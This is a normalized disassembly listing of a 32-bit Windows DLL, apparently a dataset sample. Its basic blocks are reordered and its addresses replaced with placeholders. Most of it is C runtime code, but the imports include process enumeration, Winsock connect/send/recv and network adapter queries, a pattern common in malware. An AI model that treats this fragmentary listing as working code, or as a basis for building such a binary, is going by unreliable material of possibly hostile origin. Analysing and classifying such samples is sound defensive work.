add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_100176c6
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_1000cef2
pop ecx
test eax eax
je r-xdata
call sub_1001ac30
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_1001b480
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001b110
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b4c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_1001b480
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000da4e
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1001034f
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b5bc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_1001b041
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1001b60e
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_100159c7
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_1000e69f
jmp r-xdata
push eax
call sub_1001b8b3
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_1001b668
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x16
push 0x3d
push esi
call sub_1001b9c4
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1001b60e
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1001b5bc
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_10015982
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1001b05b
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000c3e9
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_1000c3e9
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_10015982
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_10015a61
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_10015a61
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10014870
inc eax
pop ecx
inc eax
push eax
call sub_100159c7
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000c3e9
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_10014870
inc eax
pop ecx
inc eax
push eax
push edi
call sub_1001830b
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
push edi
call sub_1000c3e9
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1001034f
mov [ eax ] 0x2a
sub_1001b8b3
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10014870
mov esi eax
inc esi
push esi
call sub_1000cef2
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_1001830b
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
pop edi
pop esi
sub_1001b908
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_1000cfd0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_10001000
call sub_100014f0
xor eax eax
retn 0x4
sub_10001120
mov eax [ esp + 0x4 ]
cmp eax 0x2
je r-xdata
call sub_100012a0
cmp eax 0x4
jbe r-xdata
xor eax eax
retn 0x4
cmp eax 0x6
ja r-xdata
sub_100035a2
add eax 0x9090906
or [ ecx ] ecx
or [ ecx ] ecx
or [ edi ] eax
or ah cl
int3
sub_10006150
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
retn
sub_10007ee0
push eax
call [ GetFileAttributesA@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
Process32First
jmp [ Process32First@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_1000c43f
push 0x4
call sub_10011280
pop ecx
retn
sub_1000c74f
push [ ebp + 0x8 ]
call sub_10012186
pop ecx
retn
sub_1000c759
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c695
add esp 0xc
pop ebp
retn
sub_1000ca06
push [ ebp + 0x18 ]
call sub_10012186
pop ecx
retn
sub_1000ca10
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000c97a
add esp 0x14
pop ebp
retn
sub_1000ca2d
mov edi edi
push ebp
mov ebp esp
call sub_1000fd57
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_1000ca3f
call sub_1000fd57
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_1000cd8a
push esi
call sub_10012186
pop ecx
retn
sub_1000cee9
push 0x4
call sub_10011280
pop ecx
retn
sub_1000d1e0
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100121c2
pop ecx
pop ecx
retn
sub_1000d20f
push 0x1
call sub_10011280
pop ecx
retn
sub_1000d261
push [ ebp + 0x8 ]
call sub_10012186
pop ecx
retn
sub_1000d26b
push 0x1
call sub_1000d13e
pop ecx
retn
sub_1000d44e
push [ ebp + 0x14 ]
call sub_10012186
pop ecx
retn
sub_1000d68e
push [ ebp + 0x8 ]
call sub_10012186
pop ecx
retn
sub_1000d6ae
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000d698
sub_1000d7fd
push 0x4
call sub_10011280
pop ecx
retn
sub_1000d9d9
push [ ebp + 0x8 ]
call sub_10012186
pop ecx
retn
sub_1000dc1c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000db9e
add esp 0x10
pop ebp
retn
sub_1000deca
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_100160ca
pop ecx
pop ecx
retn
sub_1000e27c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e155
add esp 0xc
pop ebp
retn
sub_1000e2b4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e293
add esp 0xc
pop ebp
retn
sub_1000e646
call sub_1001203c
add eax 0x20
push eax
push 0x1
call sub_100121c2
pop ecx
pop ecx
retn
sub_1000e659
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1000e6f3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000e6c8
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000e70b
push 0x8
call sub_1001135a
pop ecx
retn
sub_1000e714
push 0x8
call sub_10011280
pop ecx
retn
sub_1000e8fa
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10011280
pop ecx
sub_1000e90f
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1000e7e3
add esp 0xc
pop ebp
retn
sub_1000e925
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1000e7e3
add esp 0xc
pop ebp
retn
sub_1000e93b
push 0x1
push 0x0
push 0x0
call sub_1000e7e3
add esp 0xc
retn
sub_1000ebbe
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e998
add esp 0xc
pop ebp
retn
sub_1000ed3d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ec5a
add esp 0x10
pop ebp
retn
sub_1000ee98
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ed57
add esp 0xc
pop ebp
retn
sub_1000ef6b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000eeaf
add esp 0xc
pop ebp
retn
sub_1000f349
push 0xd
call sub_10011280
pop ecx
retn
sub_1000f714
push 0xd
call sub_10011280
pop ecx
retn
sub_1000f74d
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1000f5b3
pop ecx
mov [ rw-data ] 0x1
sub_1000fa84
push 0xc
call sub_10011280
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000fb02
push 0x0
call sub_1000fa90
pop ecx
retn
sub_1000fb7d
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000fccc
push 0xd
call sub_10011280
pop ecx
retn
sub_1000fcd5
push 0xc
call sub_10011280
pop ecx
retn
sub_1000fd57
mov edi edi
push esi
call sub_1000fcde
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_1000e69f
pop ecx
sub_1000fe8b
push 0xd
call sub_10011280
pop ecx
retn
sub_1000fe97
push 0xc
call sub_10011280
pop ecx
retn
sub_100101b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10011280
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10011351
push 0xa
call sub_10011280
pop ecx
retn
sub_10011e99
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100120f3
call sub_1000d26b
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1000c3e9
pop ecx
retn
call sub_10018c05
sub_100125e9
push 0x1
call sub_10011280
pop ecx
retn
sub_100126ca
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_100125f4
add esp 0xc
pop ebp
retn 0x4
sub_100126fd
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10019749
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10012730
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_100125f4
add esp 0xc
pop ebp
retn 0x8
sub_10012f27
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_10013064
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019b4a
add esp 0x14
pop ebp
retn
sub_100131e0
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_1001346c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10013ca8
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_10013d89
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_10014342
xor eax eax
inc eax
retn
sub_100144ee
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_10015f69
retn
sub_100163d7
mov edi edi
push ebp
mov ebp esp
call sub_10016e9d
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_100163e8
mov edi edi
push ebp
mov ebp esp
call sub_10016ea3
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_100163f9
mov edi edi
push ebp
mov ebp esp
call sub_10016ea9
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_100166b6
push 0x7
call sub_10011280
pop ecx
retn
sub_10016b65
push 0x6
call sub_10011280
pop ecx
retn
sub_10016ba6
push 0x6
call sub_10011280
pop ecx
retn
sub_10016e9d
mov eax rw-data
retn
sub_10016ea3
mov eax rw-data
retn
sub_10016ea9
mov eax rw-data
retn
sub_10016eaf
mov eax rw-data
retn
sub_1001724a
call sub_1000e714
retn
sub_10017250
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10017214
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100173ab
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_100173dd
push 0x8
push r--data
call sub_10011e54
call sub_1000fd57
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001a913
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100173fd
xor eax eax
inc eax
retn
sub_10017401
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a913
sub_10017416
push sub_100173dd
call sub_1000fa90
pop ecx
mov [ rw-data ] eax
retn
sub_10017427
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1001747c
push [ rw-data ]
call sub_1000fb0b
pop ecx
retn
sub_100175fd
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10011280
pop ecx
sub_10017639
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10017648
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10017657
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10017687
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_1001769e
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
push 0x8
call [ SetLastError@IAT ]
sub_10017bb6
push 0xc
push r--data
call sub_10011e54
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
sub_10017bd3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10017c68
call sub_10017c06
mov [ rw-data ] eax
xor eax eax
retn
sub_10017d06
and [ rw-data ] 0x0
retn
sub_10018172
call sub_1000fd57
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1000fa1a
sub_100183f8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100183c0
pop ecx
pop ecx
pop ebp
retn
sub_10018657
push [ ebp + 0x8 ]
call sub_10019989
pop ecx
retn
sub_1001887a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001870e
add esp 0x14
pop ebp
retn
sub_10018c9b
push 0x1
call sub_10011280
pop ecx
retn
sub_10019619
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100194af
add esp 0x10
pop ebp
retn
sub_1001971d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10019654
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10019768
call eax
retn
sub_10019980
push 0xa
call sub_10011280
pop ecx
retn
sub_10019a83
push 0xa
call sub_10011280
pop ecx
retn
sub_10019b41
push 0xb
call sub_10011280
pop ecx
retn
sub_1001a0e9
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019fd2
add esp 0x10
pop ebp
retn
sub_1001a655
push 0x4
call sub_10011280
pop ecx
retn
sub_1001a901
push 0x4
call sub_10011280
pop ecx
retn
sub_1001a90a
push 0x2
call sub_1000e69f
pop ecx
retn
sub_1001ac46
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1001a110
sub_1001af07
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1001b041
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001af53
add esp 0x10
pop ebp
retn
sub_1001b9c4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b908
add esp 0xc
pop ebp
retn
gethostbyname
jmp [ gethostbyname@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
send
jmp [ send@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
recv
jmp [ recv@IAT ]
htons
jmp [ htons@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
connect
jmp [ connect@IAT ]
ntohs
jmp [ ntohs@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
GetNumberOfInterfaces
jmp [ GetNumberOfInterfaces@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
